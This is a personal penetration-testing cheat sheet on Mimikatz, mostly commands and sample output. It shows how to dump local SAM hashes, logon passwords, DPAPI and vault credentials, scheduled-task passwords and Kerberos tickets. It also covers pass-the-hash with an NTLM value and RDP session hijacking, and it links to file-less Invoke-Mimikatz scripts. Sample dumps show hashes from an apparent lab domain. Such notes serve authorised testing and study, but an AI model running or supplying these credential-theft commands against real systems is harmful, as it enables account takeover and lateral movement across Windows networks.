---
title: Mimikatz
date: M02-05-2023
author: i4
---

>Starting with Windows 8.1 and Windows Server 2012 R2, the LM hash and “clear-text” password are no longer in memory.
> In order to prevent the “clear-text” password from being placed in LSASS, the following registry key needs to be set to “0” (Digest Disabled):
> `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)`
- https://book.hacktricks.xyz/windows-hardening/stealing-windows-credentials/credentials-mimikatz

## Requirements
- Needs to be run as Administrator (See high elevation [[UAC Bypass]] & [[Insecure File Permissions]])
- Needs SeDebugPrivileges tokens

```cmd
C:\> mimikatz.exe
...
mimikatz # privilege::debug # Active SeDebugPrivileg
mimikatz # token::elevate # UAC => SYSTEM Mandatory Level
mimikatz # lsadump::sam # Dump local NTLM hashes
```

### RDP Session Hijack
- Use `ts::multirdp` to allow multiple connections
```
privilege::debug
token:: elevate
ts::sessions # list sessions IDs
ts::remote /id:[id] # Hijack session
```

**Without mimikatz (Needs SYSTEM)**
```
query user
create sesshijack binpath="cmd.exe /k tscon 1 /dest:rdp-tcp#[id]"
net start sesshijack
```

## SAM
```
lsadump::sam
```

### DPAPI
```
# Grab credentials 
C:\Users\<user>\Appdata\Local\microsoft\Credentials\*

$ mimikatz dpapi::cred /in:C:\<user>\Appdata\Local\microsoft\Credentials\<ID>

# find master key
# mimikatz !sekurlsa::dpapi

# use to decrypt
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\[id] /masterkey:[masterkey]
```

### Task Scheduled creds
- Dumps passwords of scheduled tasks
```
mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```

### Vault
```
vault::cred /in:C:\Users\<User>\AppData\Local\Microsoft\Vault\"
```

### Pass-The-Ticket
```mimikatz
mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
```

### Logged-On users
- NTLM & SHA-1 + SYSTEM hive can be used to crack hashes
- WDIGEST should not be enabled on the system (if not manually enabled) -> Will contain cleartext password
- 
```cmd
sekurlsa::logonpasswords

Authentication Id : 0 ; 11175293 (00000000:00aa857d)
Session           : Interactive from 1
User Name         : i4
Domain            : HEIMAT
Logon Server      : FALKE
Logon Time        : 15/02/2023 19:12:13
SID               : S-1-5-21-723141792-3823283005-3320163372-1106
        msv :
         [00000003] Primary
         * Username : i4
         * Domain   : HEIMAT
         * NTLM     : 6608E4BC7B2B7A5F77CE3573570775AF
         * SHA1     : 6E2F9E6111E77EDD0C446EA7A84E25323D137A61
         * DPAPI    : 2a8b139c8129cjsadgbbc276892a6962
        tspkg :
        wdigest :
         * Username : i4
         * Domain   : HEIMAT
         * Password : (null)
        kerberos :
         * Username : i4
         * Domain   : heimat.erde
         * Password : ????
        ssp :
        credman :
        cloudap :
```

### Kerberos Tickets
- See [[Kerberos]]
- See [[Service Account Attacks]]
```
sekurlsa::tickets

Authentication Id : 0 ; 11175293 (00000000:00aa857d)
Session           : Interactive from 1
User Name         : i4
Domain            : HEIMAT
Logon Server      : FALKE
Logon Time        : 15/02/2023 19:12:13
SID               : S-1-5-21-723141792-3823283005-3320163372-1106

         * Username : i4
         * Domain   : HEIMAT.ERDE
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 16/02/2023 05:07:26 ; 16/02/2023 15:07:22 ; 23/02/2023 05:07:22
           Service Name (02) : LDAP ; falke.heimat.erde ; heimat.erde ; @ HEIMAT.ERDE
           Target Name  (02) : LDAP ; falke.heimat.erde ; heimat.erde ; @ HEIMAT.ERDE
           Client Name  (01) : i4 ; @ HEIMAT.ERDE ( HEIMAT.ERDE )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             ????????????????????????????????????????????????????????????????
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 16/02/2023 05:07:22 ; 16/02/2023 15:07:22 ; 23/02/2023 05:07:22
           Service Name (02) : cifs ; falke.heimat.erde ; @ HEIMAT.ERDE
           Target Name  (02) : cifs ; falke.heimat.erde ; @ HEIMAT.ERDE
           Client Name  (01) : i4 ; @ HEIMAT.ERDE
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             ????????????????????????????????????????????????????????????????
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 16/02/2023 05:07:22 ; 16/02/2023 15:07:22 ; 23/02/2023 05:07:22
           Service Name (02) : krbtgt ; HEIMAT.ERDE ; @ HEIMAT.ERDE
           Target Name  (--) : @ HEIMAT.ERDE
           Client Name  (01) : i4 ; @ HEIMAT.ERDE ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             ????????????????????????????????????????????????????????????????
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 16/02/2023 05:07:22 ; 16/02/2023 15:07:22 ; 23/02/2023 05:07:22
           Service Name (02) : krbtgt ; HEIMAT.ERDE ; @ HEIMAT.ERDE
           Target Name  (02) : krbtgt ; heimat.erde ; @ HEIMAT.ERDE
           Client Name  (01) : i4 ; @ HEIMAT.ERDE ( heimat.erde )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             ????????????????????????????????????????????????????????????????
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```

#### Dumping tickets
- If the TGS is already in memory for the specific user, no administrator or  `privilege::debug` needed.
- Saves the ticket in the current dir

_mimikatz.exe_
```
mimikatz # kerberos::list /export
```

_Invoke-Mimikatz_
```
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
```

## Others
### File-less
- [PowerSploit](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)
- [Empire](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1)

### Dumping misc creds

- [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)